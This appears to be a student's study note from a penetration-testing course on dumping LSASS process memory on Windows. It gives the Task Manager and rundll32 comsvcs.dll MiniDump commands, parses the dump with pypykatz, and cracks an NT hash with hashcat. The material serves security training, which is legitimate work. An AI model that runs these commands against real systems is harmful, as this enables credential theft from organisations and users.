
>In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the `Credential Storage` section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.


![[lsassexe_diagram.png]] 

#### Task Manager Method

With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:

![[taskmanagerdump.png]]

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

> the file will be save here  as lsass.dump

```c
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

	We transfer the file and crack it offline using the same approach with sam files 

#cmd #sam_transfer #lsass

### Rundll32.exe & Comsvcs.dll Method

>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

#### Finding LSASS PID in cmd

From cmd, we can issue the command `tasklist /svc` and find lsass.exe and its process ID in the PID field.

```c
C:\Windows\system32> tasklist /svc
```

#cmd #lsass #pid

#### Finding LSASS PID in PowerShell

```c
PS C:\Windows\system32> Get-Process lsass

```powershell-session

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
#### Creating lsass.dmp using PowerShell

With an elevated PowerShell session, we can issue the following command to create the dump file:

```c
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

#powershell #lsass #pid #dumping 


## Using Pypykatz to Extract Credentials

> Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. 

#### Running Pypykatz

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file (`/home/peter/Documents/lsass.dmp`) stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

Several authentication protocols from the output: 
1. MSV
2. WDIGEST
3. Kerberos
4. DPAPI

#pypykatz #dumping #lsass 

## Cracking the NT Hash with Hashcat

> Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the `Attacking SAM` section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

#hashcat #cracking #ntlm